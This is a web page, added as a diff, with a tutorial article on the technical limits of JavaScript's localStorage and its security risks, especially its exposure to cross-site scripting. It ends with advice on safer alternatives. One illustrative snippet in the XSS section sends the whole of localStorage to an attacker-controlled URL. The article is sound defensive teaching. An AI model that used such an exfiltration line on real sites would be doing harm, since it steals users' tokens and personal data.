@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JavaScript localStorage Limitations and Security Risks - javascript</title>
+    <meta name="description" content="While localStorage provides a straightforward way to persist key-value pairs in a user's web browser, it comes with significant technical constraints and severe security vulnerabilities. This article explores the core limitations of the Web Storage API">
+    <link rel="canonical" href="https://salivity.github.io/javascript/article/javascript-localstorage-limitations-and-security-risks">
+    <link rel="search" type="application/opensearchdescription+xml" title="javascript" href="/javascript/opensearch.xml">
+    <link rel="icon" href="/javascript/favicon.ico">
+    <link rel="stylesheet" href="/javascript/css/style.css">
+    <link media="print" rel="stylesheet" href="/javascript/css/print.css">
+    <script src="/javascript/js/fuse.min.js"></script>
+    <script src="/javascript/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="JavaScript localStorage Limitations and Security Risks - javascript" />
+    <meta property="og:url" content="https://salivity.github.io/javascript/article/javascript-localstorage-limitations-and-security-risks" />
+    <meta property="og:image:url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="While localStorage provides a straightforward way to persist key-value pairs in a user's web browser, it comes with significant technical constraints and severe security vulnerabilities. This article explores the core limitations of the Web Storage API" />
+    <link rel="manifest" href="/javascript/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/javascript/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>javascript</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/javascript/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1
+id="javascript-localstorage-limitations-and-security-risks">JavaScript
+localStorage Limitations and Security Risks</h1>
+<p>While <code>localStorage</code> provides a straightforward way to
+persist key-value pairs in a user's web browser, it comes with
+significant technical constraints and severe security vulnerabilities.
+This article explores the core limitations of the Web Storage API—such
+as its synchronous execution model and 5MB storage ceiling—and details
+the primary security hazards associated with it, particularly its
+susceptibility to Cross-Site Scripting (XSS) attacks. Understanding
+these factors is essential for making informed architectural decisions
+regarding client-side data persistence.</p>
+<h2 id="technical-limitations-of-localstorage">Technical Limitations of
+localStorage</h2>
+<h3 id="1-synchronous-and-blocking-api">1. Synchronous and Blocking
+API</h3>
+<p>The <code>localStorage</code> API is entirely synchronous. Every
+read, write, and delete operation executes on the browser's main
+JavaScript thread. If an application frequently reads or writes large
+datasets, the browser interface can freeze or drop frames, directly
+degrading the user experience.</p>
+<h3 id="2-strict-storage-capacity-limits">2. Strict Storage Capacity
+Limits</h3>
+<p>Most modern web browsers cap <code>localStorage</code> capacity at
+approximately <strong>5MB per origin</strong>. Attempting to write data
+that exceeds this quota throws a <code>QuotaExceededError</code>. This
+makes <code>localStorage</code> unsuitable for storing large datasets,
+offline asset caching, or complex application states.</p>
+<h3 id="3-string-only-data-storage">3. String-Only Data Storage</h3>
+<p>The storage mechanism only supports plain strings
+(<code>DOMString</code>). Storing complex data types such as objects,
+arrays, numbers, or booleans requires manual serialization using
+<code>JSON.stringify()</code> and deserialization using
+<code>JSON.parse()</code>. This serialization introduces additional CPU
+overhead and cannot preserve data types like functions,
+<code>Date</code> objects, <code>Map</code>, <code>Set</code>, or
+<code>undefined</code>.</p>
+<h3 id="4-no-built-in-expiration-mechanism">4. No Built-in Expiration
+Mechanism</h3>
+<p>Unlike HTTP cookies, <code>localStorage</code> has no time-to-live
+(TTL) or expiration property. Data written to <code>localStorage</code>
+persists indefinitely across browser sessions and computer restarts
+until it is explicitly cleared via JavaScript, the browser settings, or
+a cache flush.</p>
+<h3 id="5-inaccessible-in-web-workers">5. Inaccessible in Web
+Workers</h3>
+<p>Because <code>localStorage</code> is tied directly to the
+<code>window</code> context, it cannot be accessed from background
+contexts such as Web Workers or Service Workers. Applications relying on
+background synchronization or worker-based compute cannot interact with
+data stored in <code>localStorage</code>.</p>
+<hr />
+<h2 id="security-implications-of-localstorage">Security Implications of
+localStorage</h2>
+<h3 id="1-high-vulnerability-to-cross-site-scripting-xss">1. High
+Vulnerability to Cross-Site Scripting (XSS)</h3>
+<p>The greatest security flaw of <code>localStorage</code> is that it is
+completely accessible to any JavaScript code running in the same origin.
+If an attacker successfully injects malicious code through an XSS
+vulnerability—via insecure input fields, compromised third-party
+scripts, or vulnerable npm dependencies—they can extract all stored data
+with a simple call:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// A malicious script can instantly steal all stored items</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://attacker-controlled-server.com/steal&#39;</span><span class="op">,</span> {</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">method</span><span class="op">:</span> <span class="st">&#39;POST&#39;</span><span class="op">,</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">body</span><span class="op">:</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(localStorage)</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<h3 id="2-lack-of-access-controls-and-flags">2. Lack of Access Controls
+and Flags</h3>
+<p>Unlike cookies, which can be secured using flags like
+<code>HttpOnly</code> (preventing access via JavaScript) and
+<code>Secure</code> (ensuring transmission over HTTPS only),
+<code>localStorage</code> has no security flags. There is no mechanism
+to mark an item in <code>localStorage</code> as private or protected
+from client-side scripts.</p>
+<h3 id="3-plaintext-local-storage">3. Plaintext Local Storage</h3>
+<p>Data in <code>localStorage</code> is saved in unencrypted plaintext
+on the user's local disk. Anyone with physical access to the device or
+local system privileges can read, modify, or delete the stored values
+directly through file access or browser developer tools.</p>
+<h3 id="4-inappropriate-for-sensitive-data">4. Inappropriate for
+Sensitive Data</h3>
+<p>Because of the risk of XSS extraction and lack of encryption, you
+should never store sensitive information in <code>localStorage</code>,
+including:</p>
+<ul>
+<li>Authentication tokens (JWTs, session IDs, bearer tokens)</li>
+<li>Passwords or API keys</li>
+<li>Personally Identifiable Information (PII)</li>
+<li>Financial or health-related data</li>
+</ul>
+<hr />
+<h2 id="when-to-use-alternatives">When to Use Alternatives</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Storage Type</th>
+<th style="text-align: left;">Recommended Use Case</th>
+<th style="text-align: left;">Why It Is Better</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>HttpOnly Cookies</strong></td>
+<td style="text-align: left;">Session IDs, JWTs, Auth Tokens</td>
+<td style="text-align: left;">Immune to client-side XSS token
+theft.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>IndexedDB</strong></td>
+<td style="text-align: left;">Large datasets, offline databases,
+files</td>
+<td style="text-align: left;">Asynchronous, non-blocking, much larger
+storage limits (hundreds of MBs).</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>sessionStorage</strong></td>
+<td style="text-align: left;">Temporary, single-tab UI states</td>
+<td style="text-align: left;">Automatically cleared when the browser tab
+closes.</td>
+</tr>
+</tbody>
+</table>
+<p><code>localStorage</code> should be reserved strictly for
+non-sensitive, low-volume, and transient data—such as user UI
+preferences (e.g., dark mode toggle), active layout choices, or
+non-critical application flags.</p></article>
+        <div id="comments-container"></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/javascript'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/javascript/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/javascript/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
